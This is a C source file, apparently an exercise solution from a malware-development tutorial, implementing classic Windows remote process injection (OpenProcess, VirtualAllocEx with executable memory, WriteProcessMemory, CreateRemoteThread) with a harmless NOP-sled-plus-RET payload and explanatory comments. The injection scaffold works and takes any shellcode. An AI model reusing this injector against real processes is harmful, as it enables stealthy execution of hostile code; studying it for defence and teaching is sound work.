/*
 * exercise 1 solution
 * classic shellcode injection - NOP sled payload
 * hack1.c
 * author: @cocomelonc
 *
 * change: the original shellcode (MessageBox) is replaced with a pure
 * NOP (0x90) sled terminated by a RET (0xC3).
 *
 * why RET matters:
 *   CreateRemoteThread launches the shellcode as a thread entry point.
 *   Without a clean return, execution falls off the buffer into
 *   unmapped memory and the target process crashes.
 *   0xC3 (RET) causes the thread function to return normally so the
 *   OS wrapper calls ExitThread and the process stays alive.
 *
 * what to observe:
 *   run hack1.exe <PID> against any live process (e.g. notepad.exe).
 *   the target must NOT crash, and this process must print "done :)".
 *
 * compile (cross-compile from Linux):
 * x86_64-w64-mingw32-gcc hack1.c -o hack1.exe -I/usr/share/mingw-w64/include/ -s -ffunction-sections -fdata-sections -Wno-write-strings -fno-exceptions -fmerge-all-constants -static-libstdc++ -static-libgcc
 */
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <windows.h>

/*
 * exercise 1 change:
 * original payload was the MessageBox shellcode.
 * new payload: 64 NOP instructions followed by a single RET.
 *
 * 0x90 = NOP  (no operation - CPU advances the instruction pointer by 1)
 * 0xC3 = RET  (return from procedure - thread entry point returns cleanly)
 */
unsigned char my_payload[] = {
  0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90,
  0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90,
  0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90,
  0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90,
  0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90,
  0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90,
  0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90,
  0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90,
  0xC3  /* RET */
};

int main(int argc, char* argv[]) {
  HANDLE ph; // process handle
  HANDLE rt; // remote thread
  PVOID  rb; // remote buffer

  if (argc < 2) {
    printf("usage: hack1.exe <PID>\n");
    return -1;
  }

  printf("[*] target PID: %i\n", atoi(argv[1]));
  ph = OpenProcess(PROCESS_ALL_ACCESS, FALSE, (DWORD)atoi(argv[1]));
  if (ph == NULL) {
    printf("[-] OpenProcess failed: %lu\n", GetLastError());
    return -1;
  }

  // allocate memory in the remote process
  rb = VirtualAllocEx(ph, NULL, sizeof(my_payload),
                      (MEM_RESERVE | MEM_COMMIT), PAGE_EXECUTE_READWRITE);

  // copy the NOP sled + RET into the remote process
  WriteProcessMemory(ph, rb, my_payload, sizeof(my_payload), NULL);

  // start the remote thread - it will slide through NOPs and hit RET
  rt = CreateRemoteThread(ph, NULL, 0,
                          (LPTHREAD_START_ROUTINE)rb, NULL, 0, NULL);

  // wait up to 2 s for the thread to finish, then clean up
  WaitForSingleObject(rt, 2000);
  CloseHandle(rt);
  CloseHandle(ph);

  printf("[+] done - target process should still be alive :)\n");
  return 0;
}
